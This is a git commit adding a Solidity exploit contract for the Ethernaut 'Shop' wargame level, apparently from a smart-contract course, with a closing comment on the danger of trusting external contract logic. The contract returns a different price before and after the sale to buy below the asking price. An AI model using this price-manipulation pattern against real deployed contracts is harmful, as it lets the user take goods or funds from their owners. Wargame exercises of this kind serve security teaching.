76e87e303987211185fd7b76fa0e66d2b858add6
Vladimir Solo <freeman.wushu@mail.ru>
2025-04-09 19:58:33 +0200

    feat: ethernaut level 20 add contract Buyers

--- lesson-17-ethernaut/level_21/Shop.sol
+++ lesson-17-ethernaut/level_21/Shop.sol
@@ -18,3 +18,25 @@ contract Shop {
         }
     }
 }
+
+contract Buyers {
+    Shop public shop;
+
+    constructor(Shop _shop) {
+        shop = _shop;
+    }
+
+    function price() public view returns (uint256) {
+        return shop.isSold() ? 1 : 150;
+    }
+
+    function buy() public {
+        shop.buy();
+    }
+}
+
+/* 
+Contracts can manipulate data seen by other contracts in any way they want.
+
+It's unsafe to change the state based on external and untrusted contracts logic.
+ */
